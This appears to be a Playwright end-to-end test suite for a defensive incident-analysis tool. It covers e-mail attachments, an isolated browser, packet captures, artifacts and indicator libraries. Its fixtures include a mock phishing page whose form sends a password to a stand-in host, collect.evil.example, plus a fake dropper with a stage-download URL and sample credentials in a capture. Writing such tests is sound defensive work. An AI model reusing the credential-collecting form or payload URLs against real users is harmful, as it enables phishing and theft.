  await page.getByRole('tab', { name: /^Attachments/ }).click()
  await expect(page.getByText('double extension .pdf.exe')).toBeVisible()
  await page.getByRole('button', { name: 'Hex' }).click()
  await expect(page.getByText('00000000  4d 5a 00 00')).toBeVisible()
  await page.getByRole('button', { name: 'Send to Malware Analysis' }).click()
  const toast = page.getByRole('status').filter({ hasText: 'invoice.pdf.exe is now a sample of this incident.' })
  await toast.getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice.pdf.exe')
})

test('attachments are previewed by the isolated workers', async () => {
  const pdf =
    '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
    '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
  const html =
    '<html><head><title>Sign in</title></head><body>' +
    // Opens a second window, as a sign-in page does for its help or its identity provider.
    '<a target="_blank" href="?help=1" style="position:fixed;left:0;top:0;width:220px;height:44px">Help</a>' +
    '<form action="https://collect.evil.example/p">' +
    '<input name="pw"></form><img src="https://cdn.evil.example/logo.png"></body></html>'
  const eml = [
    'From: Billing <billing@invoices.example>',
    'To: m.rossi@contoso.example',
    'Subject: Statement and secure link',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="b2"',
    '',
    '--b2',
    'Content-Type: text/plain',
    '',
    'See the attached statement.',
    '--b2',
    'Content-Type: application/pdf; name="statement.pdf"',
    'Content-Disposition: attachment; filename="statement.pdf"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(pdf).toString('base64'),
    '--b2',
    'Content-Type: text/html; name="secure.html"',
    'Content-Disposition: attachment; filename="secure.html"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(html).toString('base64'),
    '--b2--',
    '',
  ].join('\r\n')
  await openEvidence('Mail Analysis')
  await page
    .getByRole('button', { name: 'Upload e-mails' })
    .locator('input[type=file]')
    .setInputFiles({ name: 'statement.eml', mimeType: 'message/rfc822', buffer: Buffer.from(eml) })
  await page.getByRole('list', { name: 'Messages' }).getByText('Statement and secure link').click()
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  const preview = page.getByRole('button', { name: 'Preview' })
  const browse = page.getByRole('button', { name: 'Open in isolated browser' })
  if (process.env.E2E_DOCVIEW_URL) {
    await preview.click()
    await expect(page.getByRole('img', { name: 'Page 1 of statement.pdf' })).toBeVisible({ timeout: 60_000 })
    await page.keyboard.press('Escape')
  } else {
    await expect(preview).toBeDisabled()
  }
  if (process.env.E2E_BROWSER_URL) {
    await browse.click()
    await page
      .getByRole('dialog', { name: 'Open in the isolated browser' })
      .getByRole('button', { name: 'Open' })
      .click()
    const remote = page.getByRole('dialog', { name: /^Isolated browser/ })
    await expect(remote.getByRole('application', { name: /Remote page/ })).toBeVisible({ timeout: 60_000 })
    await expect(remote).toContainText('no network')
    await expect(remote).toContainText(/request(s)? refused/)
    // The page is drawn at the size of the space it has: one picture pixel per screen pixel.
    const picture = remote.getByRole('img', { name: /^Screenshot of/ })
    await expect
      .poll(() => picture.evaluate((img) => img.naturalWidth > 1000 && img.naturalWidth === img.clientWidth), {
        timeout: 20_000,
      })
      .toBe(true)
    await expect(remote.getByRole('button', { name: 'Full screen' })).toBeVisible()
    // A window the page opens is a tab of the session; closing it shows the first one again.
    const tabs = remote.getByRole('tablist', { name: 'Tabs of the session' })
    await expect(tabs).toHaveCount(0)
    await remote.getByRole('application', { name: /Remote page/ }).click({ position: { x: 30, y: 15 } })
    await expect(tabs.getByRole('tab')).toHaveCount(2, { timeout: 20_000 })
    await expect(tabs.getByRole('tab').nth(1)).toHaveAttribute('aria-selected', 'true')
    await tabs.getByRole('tab').first().click()
    await expect(tabs.getByRole('tab').first()).toHaveAttribute('aria-selected', 'true')
    await tabs
      .getByRole('button', { name: /^Close the tab/ })
      .nth(1)
      .click()
    await expect(tabs).toHaveCount(0)
    // The Network panel lists the refused requests (the page's image, its form target).
    await remote.getByRole('button', { name: /^Network/ }).click()
    // One per tab that loaded the page.
    await expect(remote.locator('tbody tr', { hasText: 'logo.png' }).first()).toContainText('blocked')
    await remote.getByRole('button', { name: 'Close' }).click()
    // The session becomes a capture of the incident.
    await openEvidence('Network Analysis')
    await expect(page.getByRole('list', { name: 'Captures' })).toContainText('attachment secure.html', {
      timeout: 30_000,
    })
  } else {
    await expect(browse).toBeDisabled()
  }
})

test('a packet capture opens as in Wireshark', async () => {
  await openEvidence('Network Analysis')
  await page
    .getByRole('button', { name: 'Upload packet captures' })
    .locator('input[type=file]')
    .setInputFiles('e2e/fixtures/phish.pcapng')
  await expect(page.getByRole('list', { name: 'Captures' })).toContainText('phish.pcapng')
  await page.getByRole('list', { name: 'Captures' }).getByText('phish.pcapng').click()
  if (!process.env.E2E_PCAP_URL) {
    await expect(page.getByText('stored, not analysed')).toBeVisible()
    return
  }
  const packets = page.getByRole('table', { name: 'Packets' })
  await expect(packets.locator('tbody tr').first()).toBeVisible({ timeout: 120_000 })
  // Column headers sort the loaded packets: by length, largest first on the second click.
  const lengths = async () =>
    (await packets.locator('tbody tr td:nth-child(6)').allTextContents()).map((text) => Number(text))
  await packets.getByRole('button', { name: 'Length' }).click()
  const ascending = await lengths()
  expect(ascending).toEqual([...ascending].sort((a, b) => a - b))
  await packets.getByRole('button', { name: 'Length' }).click()
  await expect(packets.getByRole('columnheader', { name: 'Length' })).toHaveAttribute('aria-sort', 'descending')
  const descending = await lengths()
  expect(descending).toEqual([...descending].sort((a, b) => b - a))
  await packets.getByRole('button', { name: 'Length' }).click()
  await expect(packets.getByRole('columnheader', { name: 'Length' })).toHaveAttribute('aria-sort', 'none')
  // A Wireshark display filter, then the packet's tree and its bytes.
  await page.getByLabel('Display filter').fill('http.request.method == "POST"')
  await page.getByRole('button', { name: 'Apply', exact: true }).click()
  await expect(packets.locator('tbody tr')).toHaveCount(1)
  await packets.locator('tbody tr').first().click()
  const tree = page.getByRole('tree', { name: 'Packet details' })
  await expect(tree).toContainText('Hypertext Transfer Protocol')
  // Public addresses in the packet's details are indicators: a click opens their window.
  const address = tree.getByRole('button', { name: /^(203\.0\.113|198\.51\.100)\.\d+$/ }).first()
  await expect(address).toBeVisible()
  await address.click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(tree.getByRole('button', { name: /^10\.\d+\.\d+\.\d+$/ })).toHaveCount(0)
  await tree.getByText('Hypertext Transfer Protocol').click()
  await expect(page.getByLabel('Packet bytes').locator('.bg-accent').first()).toBeVisible()
  // Follow the HTTP stream: the credentials in clear.
  await page.getByRole('button', { name: /^Follow HTTP stream/ }).click()
  await expect(page.getByLabel('Stream content')).toContainText('pass=Winter2026')
  await page.keyboard.press('Escape')
  // Export Objects and the summary.
  await page.getByRole('tab', { name: 'Objects' }).click()
  await expect(page.locator('tbody tr', { hasText: 'invoice.exe' })).toBeVisible()
  await page.getByRole('tab', { name: 'Summary' }).click()
  await expect(page.getByText('6 connections every 30 s')).toBeVisible()
})

test('a file is analysed on its own, tagged, then linked to the incident', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  await page
    .getByRole('dialog', { name: 'New analysis' })
    .locator('input[type=file]')
    .setInputFiles({
      name: 'dropper.bin',
      mimeType: 'application/octet-stream',
      buffer: Buffer.from('MZ analysed on its own http://198.51.100.9/stage.bin'),
    })
  // Nik asks where it goes, with "Start analysis" chosen.
  const place = page.getByRole('dialog', { name: 'Add a file' })
  await expect(place.getByRole('radio', { name: /^Start analysis/ })).toBeChecked()
  await place.getByRole('button', { name: 'Start analysis' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible({ timeout: 30_000 })
  await expect(artifact).toContainText('Not linked to an incident.')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  // The same analysis views as in an incident, without the incident-only actions.
  await expect(page.getByRole('button', { name: 'Download zip' })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Remove', exact: true })).toHaveCount(0)

  await artifact.getByRole('button', { name: 'Add tags' }).click()
  await artifact.getByLabel('Tags').fill('Emotet campaign:q4')
  await artifact.getByRole('button', { name: 'Save' }).click()
  await expect(artifact).toContainText('#emotet')
  await panel.getByLabel('Filter artifacts').fill('campaign')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await panel.getByLabel('Filter artifacts').fill('')

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  const linked = artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true })
  await expect(linked).toBeVisible()
  // The incident now holds the sample.
  await linked.click()
  await openEvidence('Malware Analysis')
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('dropper.bin', { timeout: 20_000 })

  // Dropped again, the file is recognised as already analysed.
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['MZ analysed on its own http://198.51.100.9/stage.bin'], 'again.bin'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page.getByRole('dialog', { name: 'Add a file' })).toContainText('This file was already analysed.')
  await page.keyboard.press('Escape')
  await leaveSidePanel()
})

test('an artifact is exported: the analyses, and the files only when asked', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: /^Export \d+$/ }).click()
  const dialog = page.getByRole('dialog', { name: /^Export / })
  // The original files are live malware: not in the archive unless chosen, each time.
  await expect(dialog.getByRole('radio', { name: /^Analyses only/ })).toBeChecked()
  await expect(dialog).not.toContainText('live malware')
  await dialog.getByRole('radio', { name: /^Analyses and the original files/ }).check()
  await expect(dialog).toContainText('password infected')
  await expect(dialog).toContainText('live malware')
  await dialog.getByRole('radio', { name: /^Analyses only/ }).check()
  const download = page.waitForEvent('download')
  await dialog.getByRole('button', { name: 'Download the archive' }).click()
  expect((await download).suggestedFilename()).toMatch(/^nik-artifacts-\d{4}-\d{2}-\d{2}\.zip$/)
  await expect(dialog).toBeHidden()
  // An admin can bring an archive in.
  await panel.getByRole('button', { name: 'Import' }).click()
  await expect(page.getByRole('dialog', { name: 'Import artifacts' })).toContainText('Nothing is run')
  await page.keyboard.press('Escape')
  await leaveSidePanel()
})

test('an address is scanned on its own, then linked to the incident', async () => {
  if (process.env.E2E_BROWSER_URL) test.setTimeout(180_000)
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  const dialog = page.getByRole('dialog', { name: 'New analysis' })
  // Addresses on the organisation's network are refused before anything is opened.
  await dialog.getByLabel('or an address to scan').fill('http://192.168.1.10/admin')
  await dialog.getByRole('button', { name: 'Scan address' }).click()
  await expect(dialog.getByRole('alert')).toContainText('Not scanned')
  // Defanged text is understood.
  await dialog.getByLabel('or an address to scan').fill('hxxps://nik-e2e-scan[.]invalid/login')
  await dialog.getByRole('button', { name: 'Scan address' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'nik-e2e-scan.invalid/login' })).toBeVisible({ timeout: 30_000 })
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('nik-e2e-scan.invalid/login')
  if (process.env.E2E_BROWSER_URL) {
    // The isolated browser visited it: a verdict with its reasons, and the visit's capture.
    await expect(page.getByText('WHY THIS VERDICT')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('HOW THE BROWSER GOT THERE')).toBeVisible()
    await expect(artifact).toContainText('browser session')
  } else {
    await expect(page.getByText('The address was not visited.', { exact: true })).toBeVisible({ timeout: 30_000 })
    await expect(page.getByText(/isolated browser is not configured/)).toBeVisible()
  }

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  await artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true }).click()
  await openEvidence('URL Analysis')
  await expect(page.getByRole('list', { name: 'Addresses' })).toContainText('nik-e2e-scan.invalid/login', {
    timeout: 20_000,
  })
  await leaveSidePanel()
})

test('right-click works on lists, indicators and artifacts', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const menu = page.getByRole('menu')

  // A sample in the incident's list: its own actions, and the flag.
  await openEvidence('Malware Analysis')
  const samples = page.getByRole('list', { name: 'Samples' })
  await samples.getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Open as an artifact')
  await expect(menu).toContainText('Remove from the incident')
  await menu.getByRole('menuitem', { name: 'Flag the sample' }).click()
  await expect(samples.getByLabel('Flagged')).toHaveCount(1)

  // An indicator is flagged by hand from its menu, wherever it is shown.
  await tabs.getByRole('button', { name: 'Indicators', exact: true }).click()
  const address = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(address).toBeVisible({ timeout: 20_000 })
  // The list reloads after the flag above: a menu closes when the page moves under it.
  await page.waitForLoadState('networkidle')
  await address.click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Flag the indicator' }).click()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.locator('ol li', { hasText: '185.220.101.47' }).first()).toBeVisible()
  await expect(page.locator('ol li', { hasText: 'dropper.bin' }).first()).toBeVisible()
  // A flagged item on the Summary has the menu too.
  await page.locator('ol li', { hasText: 'dropper.bin' }).first().click({ button: 'right' })
  await expect(menu).toContainText('Remove the flag')
  await page.keyboard.press('Escape')

  // An artifact in the panel.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await expect(menu).toContainText('Copy link')
  await expect(menu).toContainText('Where else was this seen?')
  await page.keyboard.press('Escape')
  await leaveSidePanel()
})

test('pasted text is recognised: an address to scan, an indicator to look up', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)
  const prompt = page.getByRole('region', { name: 'Pasted text' })

  // Ordinary text is left alone.
  await paste('just some words')
  await expect(prompt).toHaveCount(0)

  // A defanged address: read as it was meant, opened only if the analyst chooses.
  await paste('hxxps://nik-e2e-scan[.]invalid/login')
  await expect(prompt).toContainText('URL')
  await expect(prompt).toContainText('https://nik-e2e-scan.invalid/login')
  await expect(prompt.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await prompt.getByRole('button', { name: 'Dismiss' }).click()
  await expect(prompt).toHaveCount(0)

  // An indicator: search it, or see where it was seen.
  await paste('185.220.101[.]47')
  await expect(prompt).toContainText('IP address')
  await prompt.getByRole('button', { name: 'Search in Nik' }).click()
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette.getByRole('textbox', { name: 'Search' })).toHaveValue('185.220.101.47')
  await page.keyboard.press('Escape')
  await paste('185.220.101.47')
  await prompt.getByRole('button', { name: 'Where seen' }).click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toContainText('WKS-FINANCE-01')
  await page.keyboard.press('Escape')
})

test('the Indicators page: paste many, group them in a list, export with chosen fields, plan a bulk check', async () => {
  const paste = (text) =>
    page.evaluate((value) => {
      const data = new DataTransfer()
      data.setData('text/plain', value)
      document.body.dispatchEvent(new ClipboardEvent('paste', { clipboardData: data, bubbles: true }))
    }, text)

  // Several values pasted anywhere open "Add indicators" with what Nik read.
  await paste('203.0.113[.]77\nhxxps://nik-e2e-list[.]invalid/get.php\nnot an indicator\n10.12.0.4')
  const add = page.getByRole('dialog', { name: 'Add indicators' })
  const found = add.getByRole('region', { name: 'What Nik found' })
  await expect(found).toContainText('New indicators 3')
  await expect(found).toContainText('Not recognised show1')
  await expect(add.getByLabel('Indicators', { exact: true })).toHaveValue(/203\.0\.113\[\.\]77/)
  // A list is asked for, never assumed.
  await expect(add.getByRole('combobox').first()).toHaveValue('none')
  await add.getByRole('combobox').first().selectOption('new')
  await add.getByLabel('New list name').fill('E2E wave')
  await add.getByLabel('Check them when saved').uncheck()
  await add.getByRole('button', { name: 'Save 3 indicators' }).click()

  // The list opens on its own page, with an address to share.
  await expect(page).toHaveURL(/\/iocs\/lists\/[0-9a-f]{32}$/)
  const table = page.getByRole('table', { name: 'Indicators' })
  await expect(table.locator('tbody tr')).toHaveCount(3)
  await expect(table).toContainText('https://nik-e2e-list.invalid/get.php')
  await expect(table.locator('tbody tr', { hasText: '10.12.0.4' })).toContainText('never sent out')
  const panel = page.getByRole('complementary', { name: 'IoCs panel' })
  await expect(panel.getByRole('button', { name: /E2E wave/ })).toHaveAttribute('aria-current', 'true')
  const listUrl = page.url()

  // Columns sort on the server.
  await table.getByRole('button', { name: 'Value' }).click()
  await expect(table.locator('tbody tr').first()).toContainText('10.12.0.4')

  // Export: the main fields are ticked; the preview follows the choice.
  await page.getByRole('button', { name: 'Export', exact: true }).click()
  const exportDialog = page.getByRole('dialog', { name: /^Export · E2E wave/ })
  const preview = exportDialog.getByLabel('Export preview')
  await expect(preview).toContainText('type,value,verdict,score,tags,first_seen')
  await exportDialog.getByLabel('Lists').check()
  await exportDialog.getByLabel('Defang values').check()
  await expect(preview).toContainText('first_seen,lists')
  await expect(preview).toContainText('203[.]0[.]113[.]77')
  await exportDialog.getByRole('radio', { name: /^Text/ }).check({ force: true })
  await expect(preview).not.toContainText('first_seen')
  const download = page.waitForEvent('download')
  await exportDialog.getByRole('button', { name: /^Download e2e-wave\.txt/ }).click()
  expect((await download).suggestedFilename()).toBe('e2e-wave.txt')

  // Bulk check: what it costs is shown before anything is asked.
  await page.getByRole('button', { name: 'Check all 3' }).click()
  const check = page.getByRole('dialog', { name: /^Check 3 indicators/ })
  await expect(check).toContainText('Never sent out')
  await expect(check.getByRole('button', { name: 'Start' })).toBeVisible()
  await check.getByRole('button', { name: 'Cancel' }).click()

  // The whole library: the incident's indicators are there too, tinted by verdict only.
  await panel.getByRole('button', { name: /^All indicators/ }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  const attacker = table.locator('tbody tr', { hasText: '185.220.101.47' }).first()
  await expect(attacker).toContainText('incident')
  await expect(attacker).not.toHaveClass(/bg-high-soft/)

  // A file of indicators dropped anywhere is read as one, and can join a list.
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['type,value,tags\nip,198.51.100.23,c2\ndomain,nik-e2e-feed.invalid,c2\n'], 'feed.csv'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(add).toContainText('feed.csv')
  await expect(found).toContainText('CSV')
  await expect(found).toContainText('New indicators 2')
  await add.getByRole('combobox').first().selectOption({ label: 'Yes: add to "E2E wave"' })
  await add.getByLabel('Check them when saved').uncheck()
  await add.getByRole('button', { name: 'Save 2 indicators' }).click()
  await expect(page).toHaveURL(listUrl)
  await expect(table.locator('tbody tr')).toHaveCount(5)
  await expect(table.locator('tbody tr', { hasText: '198.51.100.23' })).toContainText('import')

  // The link alone opens the list; an incident leaves the library.
  await page.reload()
  await expect(page.getByRole('heading', { name: /E2E wave/ })).toBeVisible({ timeout: 20_000 })
  await openIncidentFromList()
  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
})

test('the page always follows the address: incident, artifact, library, indicator', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const library = page.getByRole('table', { name: 'Indicators' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const palette = page.getByRole('dialog', { name: 'Search' })
  const indicator = page.getByRole('dialog', { name: 'Indicator' })
  const openLibrary = async () => {
    if (!(await page.getByRole('complementary', { name: 'IoCs panel' }).count()))
      await rail.getByRole('button', { name: /^Indicators/ }).click()
    await page
      .getByRole('complementary', { name: 'IoCs panel' })
      .getByRole('button', { name: /^All indicators/ })
      .click()
    await expect(page).toHaveURL(/\/iocs$/)
    await expect(library).toBeVisible()
  }
  /** What the main area shows must be what the address says. */
  const expectIncident = async () => {
    await expect(page).toHaveURL(/\/incident\//)
    await expect(tabs).toBeVisible()
    await expect(library).toHaveCount(0)
    await expect(artifact).toHaveCount(0)
  }

  // From the library, an incident found with the search.
  await openLibrary()
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('WKS-FINANCE')
  await palette
    .getByRole('option', { name: /WKS-FINANCE-01/ })
    .first()
    .click()
  await expectIncident()

  // From the library, "go to a tab" of the search.
  await openLibrary()
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expectIncident()
  await expect(tabs.locator('[aria-current="page"]')).toContainText('Timeline')

  // From the library, the incident an indicator was seen in.
  await openLibrary()
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  await library.getByRole('button', { name: '185.220.101.47', exact: true }).first().click()
  await indicator
    .getByRole('region', { name: 'Seen in' })
    .getByRole('button', { name: 'Open', exact: true })
    .first()
    .click()
  await expect(indicator).toHaveCount(0)
  await expectIncident()

  // Library, then the artifacts and one of them, then Back and Forward: each address shows its own page.
  await openLibrary()
  await rail.getByRole('button', { name: 'Artifacts', exact: true }).click()
  await page.getByRole('navigation', { name: 'Artifacts' }).getByRole('button').first().click()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(artifact).toBeVisible()
  await expect(library).toHaveCount(0)
  // The entry of the artifacts showed their page, with none open: that is where Back goes first.
  const none = page.getByRole('heading', { name: 'No artifact selected' })
  await page.goBack()
  await expect(page).toHaveURL(/\/artifacts$/)
  await expect(none).toBeVisible()
  await page.goBack()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(library).toBeVisible()
  await expect(artifact).toHaveCount(0)
  await expect(none).toHaveCount(0)
  await page.goForward()
  await expect(none).toBeVisible()
  await page.goForward()
  await expect(page).toHaveURL(/\/artifact\//)
  await expect(artifact).toBeVisible()
  await expect(library).toHaveCount(0)

  // From an artifact, an incident found with the search.
  await page.keyboard.press('ControlOrMeta+k')
  await palette.getByRole('textbox', { name: 'Search' }).fill('WKS-FINANCE')
  await palette
    .getByRole('option', { name: /WKS-FINANCE-01/ })
    .first()
    .click()
  await expectIncident()

  // An indicator's page over the library: back to a window keeps it open and restores the address.
  await openLibrary()
  await page.getByLabel('Filter indicators').fill('185.220.101.47')
  await library.getByRole('button', { name: '185.220.101.47', exact: true }).first().click()
  await indicator.getByRole('button', { name: 'Open as a page' }).click()
  await expect(page).toHaveURL(/\/ioc\/ip\?v=185\.220\.101\.47$/)
  await indicator.getByRole('button', { name: 'Back to a window' }).click()
  await expect(page).toHaveURL(/\/iocs$/)
  await expect(indicator).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(library).toBeVisible()

  // Back to the incident for the tests that follow.
  await openIncidentFromList()
  await expectIncident()
})

test('an indicator and the artifact that is its analysis lead to each other', async () => {
  const rail = page.getByRole('navigation', { name: 'Sections' })
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const indicator = page.getByRole('dialog', { name: 'Indicator' })

  // The artifact as an indicator: its value and what the sources say about it.
  await rail.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel
    .getByRole('navigation', { name: 'Artifacts' })
    .getByRole('button', { name: /dropper\.bin/ })
    .click()
  await expect(artifact).toContainText('AS AN INDICATOR')
  await expect(artifact).toContainText(/Reputation: (not checked|\w+ \d+)/)

  // From the indicator back to the analysis Nik made of it.
  await artifact
    .getByRole('button', { name: /^[0-9a-f]{64}$/ })
    .first()
    .click()
  const analysed = indicator.getByRole('region', { name: 'Analysed by Nik' })
  await expect(analysed).toContainText('Analysis · what Nik saw')
  await expect(indicator).toContainText('Reputation · what the sources say')
  // The artifact is on its own or in the incident: either way "Seen in" names it.
  await expect(indicator.getByRole('region', { name: 'Seen in' })).toContainText(/dropper\.bin|file:/)
  await analysed.getByRole('button', { name: 'Open the analysis' }).click()
  await expect(indicator).toHaveCount(0)
  await expect(page).toHaveURL(/\/artifact\/file-[0-9a-f]{64}$/)
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible()

  // An address not analysed yet: the page and the right-click menu offer to analyse it.
  await rail.getByRole('button', { name: /^Indicators/ }).click()
  const library = page.getByRole('table', { name: 'Indicators' })
  await page
    .getByRole('complementary', { name: 'IoCs panel' })
    .getByRole('button', { name: /^Addresses to analyse/ })
    .click()
  await expect(library.locator('tbody tr').first()).toContainText('not analysed')
  const address = library.getByRole('button', { name: /^https?:\/\// }).first()
  await address.click({ button: 'right' })
  await expect(page.getByRole('menu').getByRole('menuitem', { name: /^Analyse URL/ })).toBeVisible()
  await page.keyboard.press('Escape')
  await address.click()
  await expect(indicator.getByRole('region', { name: 'Analysed by Nik' })).toContainText('Not analysed by Nik yet')
  await expect(indicator.getByRole('button', { name: 'Analyse URL' })).toBeVisible()
  await page.keyboard.press('Escape')

  // Several at once: what would be visited is shown first, and nothing is visited until confirmed.
  await page.getByLabel('Select the page').check()
  await page.getByRole('region', { name: 'Selection' }).getByRole('button', { name: 'Analyse addresses' }).click()
  const plan = page.getByRole('dialog', { name: 'Analyse addresses' })
  await expect(plan).toContainText('A visit is seen by the site')
  await expect(plan.getByRole('button', { name: /^Visit \d+ address/ })).toBeVisible()
  await plan.getByRole('button', { name: 'Cancel' }).click()

  await openIncidentFromList()
})

test('a mailbox is indexed, its messages imported, and its conversations drawn as a graph', async () => {
  test.setTimeout(180_000)
  const artifact = page.getByRole('region', { name: 'Artifact' })
  const mail = (id, subject, from, date, reply) =>
    [
      'From sender@example.org Tue Nov 10 08:31:00 2026',
      `From: ${from}`,
      'To: finance@example.org',
      `Subject: ${subject}`,
      `Date: ${date}`,
      `Message-ID: <${id}@nik-e2e.example>`,
      ...(reply ? [`In-Reply-To: <${reply}@nik-e2e.example>`] : []),
      '',
      'Please see the invoice.',
      '>From the accounts team',
      '',
    ].join('\n')
  const mbox = [
    mail('q1', 'Quarterly invoice', 'billing@nik-e2e-vendor.example', 'Tue, 10 Nov 2026 08:31:00 +0000'),
    mail('q2', 'Re: Quarterly invoice', 'finance@example.org', 'Wed, 11 Nov 2026 09:00:00 +0000', 'q1'),
    mail('q3', 'Fwd: Quarterly invoice', 'colleague@example.org', 'Wed, 11 Nov 2026 10:00:00 +0000', 'q1'),
  ].join('\n')

  // Dropped anywhere, an mbox becomes a mailbox artifact: indexed, nothing analysed yet.
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'team.mbox'))
    return data
  }, mbox)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page).toHaveURL(/\/artifact\/mailbox-[0-9a-f]{32}$/, { timeout: 30_000 })
  await expect(artifact).toContainText('team.mbox')
  await expect(artifact).toContainText('Nothing imported yet', { timeout: 30_000 })
  await expect(artifact).toContainText('0 of 3 messages imported')

  // The import says what it will take before taking it.
  await artifact.getByRole('button', { name: 'Import messages' }).first().click()
  const dialog = page.getByRole('dialog', { name: 'Import from team.mbox' })
  await expect(dialog.getByRole('status', { name: 'Import plan' })).toContainText('3 messages match')
  await dialog.getByLabel('Sender or domain').fill('nik-e2e-vendor.example')
  await expect(dialog.getByRole('status', { name: 'Import plan' })).toContainText(
    '1 message matches · 3 with their conversations',
  )
  await dialog.getByRole('button', { name: 'Import 3 messages' }).click()

  // The graph: a row per message, newest first, each imported one with its verdict.
  const rows = artifact.getByRole('list', { name: 'Messages' }).getByRole('listitem')
  await expect(rows).toHaveCount(3, { timeout: 120_000 })
  await expect(artifact).toContainText('3 of 3 messages imported', { timeout: 120_000 })
  await expect(rows.first()).toContainText('Fwd: Quarterly invoice')
  await expect(rows.last()).toContainText('Quarterly invoice')
  await expect(rows.last()).not.toContainText('not imported')

  // A row shows the message and what it answers; the e-mail opens as its own artifact.
  await rows
    .nth(1)
    .getByRole('button', { name: /Re: Quarterly invoice/ })
    .click()
  const detail = artifact.getByRole('complementary', { name: 'Message' })
  await expect(detail).toContainText('finance@example.org')
  await expect(detail.getByRole('button', { name: 'Quarterly invoice', exact: true })).toBeVisible()
  await detail.getByRole('button', { name: 'Open the e-mail' }).click()
  await expect(page).toHaveURL(/\/artifact\/mail-[0-9a-f]{64}$/)
  await page.goBack()
  await expect(page).toHaveURL(/\/artifact\/mailbox-[0-9a-f]{32}$/)
  await expect(rows).toHaveCount(3)

  // All of them, or the ticked ones, go in an incident.
  await rows.first().getByRole('checkbox').check()
  await artifact.getByRole('button', { name: 'Put 1 in an incident' }).click()
  const link = page.getByRole('dialog', { name: 'Put messages in an incident' })
  await expect(link).toContainText('Only the phishing and suspicious ones add indicators')
  await link.getByRole('button', { name: 'Put the 1 selected' }).click()
